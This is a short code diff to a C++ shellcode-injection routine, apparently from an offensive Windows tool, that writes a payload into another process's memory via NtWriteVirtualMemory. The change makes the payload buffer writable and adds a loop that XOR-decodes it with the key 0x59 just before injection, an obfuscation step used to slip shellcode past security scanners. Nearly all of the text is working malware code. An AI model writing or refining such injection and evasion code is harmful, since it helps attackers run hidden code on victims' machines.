@@ -83,7 +83,7 @@ bool EnableAllRequiredPrivileges() {
 	return allSucceeded;
 }
 
-bool syscall_injection(_In_ const char* process_id, _In_ const unsigned char* payload, _In_ SIZE_T payload_size) {
+bool syscall_injection(_In_ const char* process_id, _In_  unsigned char* payload, _In_ SIZE_T payload_size) {
 	using std::cout;
 	using std::endl;
 
@@ -164,6 +164,10 @@ bool syscall_injection(_In_ const char* process_id, _In_ const unsigned char* pa
 		return false;
 	}
 	cout << "virtual mem allocated,\n rBuffer: " << rBuffer << " \nshellcode size: " << sc << endl;
+
+	for (size_t i = 0; i < payload_size; i++) {
+		payload[i] = payload[i] ^ 0x59;
+	}
 
 	STATUS = NtWriteVirtualMemory(hProcess, rBuffer, (PVOID)payload, payload_size, NULL);
 	if (STATUS != STATUS_SUCCESS) {
